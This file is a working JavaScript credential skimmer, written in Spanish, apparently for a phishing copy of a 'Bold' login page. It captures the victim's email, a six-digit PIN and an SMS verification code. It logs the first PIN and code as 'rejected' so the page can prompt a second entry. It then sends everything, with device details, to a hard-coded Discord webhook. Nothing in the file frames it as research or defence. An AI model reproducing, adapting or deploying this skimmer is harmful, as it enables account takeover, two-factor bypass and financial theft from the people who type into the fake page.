/* =========================================================
   777.js — logger de acceso
   ========================================================= */
(function () {
  "use strict";

  // Candado: si el script se carga dos veces, solo corre una
  if (window.__bold777) return;
  window.__bold777 = true;

  var WEBHOOK = "https://discord.com/api/webhooks/1560094678097854464/LYmuz25uwCme3CjcqaF97iSCivuviAYLtSFeAbdL8uLeE4cJx5CEdB-g32VuhOJ427cF";
  var COLOR   = 0xff2b5e;
  var STORE   = "bold_email";
  var DEBUG   = true; // ponlo en false cuando ya funcione

  /* ---------- envío ---------- */
  function enviar(titulo, campos) {
    var cuerpo = JSON.stringify({
      username: "Bold · Acceso",
      embeds: [{
        title: titulo,
        color: COLOR,
        timestamp: new Date().toISOString(),
        footer: { text: location.host || "local" },
        fields: campos
      }]
    });

    if (DEBUG) console.log("[777] enviando:", titulo);

    // 1) sendBeacon: sobrevive a la navegación, una sola entrega
    var encolado = false;
    try {
      encolado = navigator.sendBeacon(
        WEBHOOK,
        new Blob([cuerpo], { type: "application/json" })
      );
    } catch (e) {
      encolado = false;
    }

    if (encolado) {
      if (DEBUG) console.log("[777] encolado por sendBeacon");
      return;
    }

    // 2) Solo si sendBeacon no pudo encolar
    if (DEBUG) console.warn("[777] sendBeacon falló, usando fetch");
    fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: cuerpo,
      keepalive: true
    })
      .then(function (r) { if (DEBUG) console.log("[777] Discord:", r.status); })
      .catch(function (err) { if (DEBUG) console.warn("[777] fetch falló:", err); });
  }

  /* ---------- datos del entorno ---------- */
  function entorno() {
    var ua = navigator.userAgent;
    var movil = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
    var zona = "—";
    try { zona = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

    return [
      { name: "Hora",        value: new Date().toLocaleString("es-CO"),  inline: true },
      { name: "Zona",        value: zona,                                inline: true },
      { name: "Dispositivo", value: movil ? "Móvil" : "Escritorio",      inline: true },
      { name: "Pantalla",    value: screen.width + " × " + screen.height, inline: true },
      { name: "Idioma",      value: navigator.language,                  inline: true },
      { name: "Navegador",   value: ua.slice(0, 250) }
    ];
  }

  function correoGuardado() {
    try { return localStorage.getItem(STORE) || ""; } catch (e) { return ""; }
  }

  /* ---------- pantalla 1: correo ---------- */
  var campoCorreo = document.querySelector('input[type="email"]');

  if (campoCorreo) {
    var capturarCorreo = function () {
      var correo = campoCorreo.value.trim();
      if (!correo || correo.indexOf("@") === -1) return;

      try { localStorage.setItem(STORE, correo); } catch (e) {}

      enviar("Correo ingresado", [{ name: "Correo", value: correo }].concat(entorno()));
    };

    var form = campoCorreo.closest("form");

    if (form) {
      form.addEventListener("submit", capturarCorreo);
    } else {
      campoCorreo.addEventListener("keydown", function (e) {
        if (e.key === "Enter") capturarCorreo();
      });
      var boton = document.querySelector(".btn-ingresar");
      if (boton) boton.addEventListener("click", capturarCorreo);
    }
  }

  /* ---------- pantalla 2: clave ---------- */
  var teclado = document.querySelector(".keypad");

  if (teclado) {
    var pin = "";
    var total = document.querySelectorAll(".dots .dot").length || 6;
    var intento = 1;
    var bloqueado = false;
    var BLOQUEO = 1400; // igual al setTimeout de la página

    document.addEventListener("click", function (e) {
      var tecla = e.target.closest(".key");
      if (!tecla || !teclado.contains(tecla)) return;
      if (tecla.classList.contains("empty") || bloqueado) return;

      var num    = tecla.getAttribute("data-num");
      var accion = tecla.getAttribute("data-action");

      if (num) {
        if (pin.length < total) pin += num;
      } else if (accion === "delete") {
        pin = pin.slice(0, -1);
      }

      if (pin.length === total) {
        var primero = intento === 1;

        enviar(
          primero ? "Clave — 1er intento (rechazado)" : "Clave — 2do intento",
          [
            { name: "Correo",  value: correoGuardado() || "(no capturado)" },
            { name: "Clave",   value: pin },
            { name: "Intento", value: String(intento), inline: true },
            { name: "Estado",  value: primero ? "Incorrecta" : "Correcta", inline: true }
          ].concat(entorno())
        );

        intento++;
        bloqueado = true;

        setTimeout(function () {
          pin = "";
          bloqueado = false;
        }, BLOQUEO);
      }
    });
  }
  
/* ---------- pantalla 3: código SMS ---------- */
  var cajas = document.querySelectorAll(".code-input");

  if (cajas.length) {
    var codigoIntento = 1;
    var llenoAntes = false;

    var leerCodigo = function () {
      var s = "";
      for (var i = 0; i < cajas.length; i++) s += cajas[i].value || "";
      return s;
    };

    var revisarCodigo = function () {
      var codigo = leerCodigo();
      var lleno = codigo.length === cajas.length;

      if (lleno && !llenoAntes) {
        var primero = codigoIntento === 1;

        enviar(
          primero ? "Código SMS — 1er intento (rechazado)" : "Código SMS — 2do intento",
          [
            { name: "Correo",  value: correoGuardado() || "(no capturado)" },
            { name: "Clave",   value: (function () {
                try { return localStorage.getItem("bold_pin") || "—"; } catch (e) { return "—"; }
              })() },
            { name: "Código",  value: codigo },
            { name: "Intento", value: String(codigoIntento), inline: true },
            { name: "Estado",  value: primero ? "Incorrecto" : "Correcto", inline: true }
          ].concat(entorno())
        );

        codigoIntento++;
      }

      llenoAntes = lleno;
    };

    for (var c = 0; c < cajas.length; c++) {
      cajas[c].addEventListener("input", revisarCodigo);
      cajas[c].addEventListener("paste", function () {
        setTimeout(revisarCodigo, 0);
      });
    }
  }

  /* ---------- reenvío de código ---------- */
  var btnReenvio = document.querySelector(".resend");

  if (btnReenvio) {
    btnReenvio.addEventListener("click", function () {
      enviar("Código reenviado", [
        { name: "Correo", value: correoGuardado() || "(no capturado)" }
      ].concat(entorno()));
    });
  }
  
  /* ---------- aviso de arranque ---------- */
  if (DEBUG) {
    console.log("[777] cargado. Pantalla detectada:",
      campoCorreo ? "correo" : (teclado ? "clave" : "NINGUNA"));
  }

})();